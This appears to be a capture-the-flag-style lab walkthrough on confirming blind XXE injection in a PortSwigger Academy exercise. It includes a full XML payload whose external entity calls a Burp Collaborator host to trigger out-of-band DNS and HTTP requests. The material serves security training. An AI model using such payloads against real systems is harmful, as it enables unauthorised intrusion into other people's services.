# Blind XXE — Confirmed via Out-of-Band Interaction

This lab's "Check stock" feature parses XML input, but the parsed result is never shown back in the response.

Since nothing is reflected, the flaw has to be confirmed by triggering an out-of-band interaction with an external host.

**Goal:** Use an external entity to force the XML parser to perform a DNS lookup and HTTP request against Burp Collaborator.

Note: The Academy's firewall stops the lab environment from reaching arbitrary external systems, so Burp Collaborator's own public server must be used for this to work.

---

**Reference:**
- https://portswigger.net/web-security/xxe/blind

pic 1

---

Reusing the same structure as the previous lab, but pointing the URL at a Collaborator address instead:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://3vzysj2gzhhn64eedhoks71zjqphd71w.oastify.com"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

pic 2

Sure enough, incoming requests appear under the Collaborator tab:

pic 3
